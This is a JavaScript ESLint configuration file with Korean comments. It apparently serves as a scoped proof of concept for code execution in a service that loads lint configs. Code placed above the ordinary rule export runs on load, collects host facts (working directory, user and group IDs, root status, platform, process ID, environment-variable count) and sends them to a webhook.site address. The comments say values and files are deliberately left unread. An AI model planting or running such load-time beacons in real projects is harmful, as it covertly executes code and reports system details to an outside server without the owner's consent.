// s4b — s4 로 "실행 + 아웃바운드"가 확인됐다. 이제 **등급을 정하는 데 필요한 최소한**만 본다.
//
// 규율: **값은 읽지 않는다.** 환경변수는 이름도 값도 보지 않고 **개수만** 센다.
// 파일시스템 탐색도 하지 않는다. 다른 테넌트에 닿을 수 있는 행위는 전부 제외했다.
// 여기서 보는 것은 "이 실행이 얼마나 특권적인가" 하나다.
const M = 'CRMARK-06fef04be9dc';

function facts() {
  const p = globalThis.process;
  const f = {};
  const put = (k, fn) => { try { f[k] = fn(); } catch (e) { f[k] = 'threw'; } };
  put('cwd', () => p.cwd());
  put('uid', () => (p.getuid ? p.getuid() : 'n/a'));
  put('gid', () => (p.getgid ? p.getgid() : 'n/a'));
  put('root', () => (p.getuid ? p.getuid() === 0 : 'n/a'));
  put('node', () => p.version);
  put('platform', () => p.platform + '/' + p.arch);
  put('pid', () => p.pid);
  // 개수만. 이름·값은 수집하지 않는다.
  put('envCount', () => Object.keys(p.env).length);
  put('argvCount', () => p.argv.length);
  put('fetch', () => typeof globalThis.fetch);
  return f;
}

try {
  const f = facts();
  const q = Object.keys(f).map((k) => k + '=' + encodeURIComponent(String(f[k]))).join('&');
  fetch('https://webhook.site/b237c48c-bf1b-481d-b0fa-8476674f885c/s4b-context?m=' + M + '&' + q).catch(() => {});
} catch (e) { /* 무시 */ }

export default [
  { files: ['**/*.js', '**/*.mjs'], rules: { 'no-unused-vars': 'warn' } },
];
